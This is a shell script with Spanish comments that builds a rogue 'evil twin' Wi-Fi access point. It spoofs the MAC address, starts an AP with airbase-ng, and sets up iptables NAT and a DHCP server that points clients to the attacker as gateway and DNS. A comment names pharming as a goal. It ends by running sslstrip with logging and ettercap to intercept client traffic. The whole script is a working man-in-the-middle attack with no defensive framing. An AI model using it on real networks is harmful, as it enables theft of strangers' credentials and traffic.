# Instalacion de dependencias
apt-get install isc-dhcp-server

# Tiramos los procesos que puedan causar problemas
airmon check kill
airmon-ng start wlan0

# Cambiamos la direccion MAC a una aleatoria
ifconfig wlan0mon down
macchanger wlan0mon -r
ifconfig wlan0mon up

# Levantamos nuestro AP
airbase-ng -e "test_sg" -v wlan0mon -c 11

# Limpiamos configuraciones previas de iptables
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain

# Levantamos y configuramos una interfaz puente que hace de gateway
ifconfig at0 up
ifconfig at0 192.168.27.1 netmask 255.255.255.0

# Enrutamos el rango 192.168.27.0/24 hacia la interfaz que hemos levantado
route add -net 192.168.27.0 netmask 255.255.255.0 gw 192.168.27.1

# Configuramos iptables para aceptar el redireccionmiento 
iptables -P FORWARD ACCEPT

# Añadimos una entrada a la tabla nat de iptables para 
# redireccionar el trafico de los cliente hacia nuestra interfaz conectada 
# a internet
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

#Activamos redireccionamiento ip
echo 1 > /proc/sys/net/ipv4/ip_forward


echo "authoritative;
subnet 192.168.27.0 netmask 255.255.255.0 {
  range 192.168.27.230 192.168.27.254;
  option routers 192.168.27.1;
  option domain-name-servers 192.168.27.1;
}" > dchpd.conf

touch /var/lib/dhcp/dhcpd.leases

dhcpd -cf ./dchpd.conf -f -d



#4.-Configurar un servicio DNS
#Al igual que en el caso anterior, si deseamos tener 
# nuestro propio servidor de DNS, instalando dnsmasq y 
# arrancando el servicio sería suficiente. La ventaja de 
# ener un servidor DNS propio es que se pueden apuntar 
# dominios a páginas propias y llevar a cabo un pharming. 
# Si el por el contrario queréis obviar esta parte, tan solo
# haría que especificar en el fichero de configuración del DHCP 
# los DNS de otro servidor, en la línea de "domain-name-servers", 
# por ejemplo, los de Google.

sslstrip -a -w /root/wifi/log.txt

ettercap -p -u -T -q -i at0 


